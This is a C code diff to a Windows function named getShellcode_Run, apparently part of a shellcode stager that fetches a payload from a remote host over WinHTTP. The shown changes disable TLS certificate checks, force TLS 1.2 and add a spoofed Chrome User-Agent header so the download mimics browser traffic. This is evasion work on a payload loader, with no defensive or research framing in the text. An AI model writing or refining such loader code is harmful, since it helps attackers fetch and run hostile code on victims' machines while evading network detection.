@@ -335,7 +335,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto cleanup;
     }
 
-    // Set TLS 1.2 only (mimic minimal program’s likely success)
+    // Set TLS 1.2 only
     DWORD tlsFlags = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
     if (!WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &tlsFlags, sizeof(tlsFlags))) {
         char msg[256];
@@ -359,7 +359,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto cleanup;
     }
 
-    // Apply SSL bypass flags (same as minimal program)
+    // Apply SSL bypass flags
     DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | 
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | 
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 
@@ -371,8 +371,9 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto cleanup;
     }
 
-    // Send the request
-    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    // Add User-Agent header to mimic a browser
+    LPCWSTR headers = L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n";
+    bResults = WinHttpSendRequest(hRequest, headers, -1L, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     if (!bResults) {
         char msg[256];
         sprintf_s(msg, "WinHttpSendRequest failed with error: %ld\n", GetLastError());
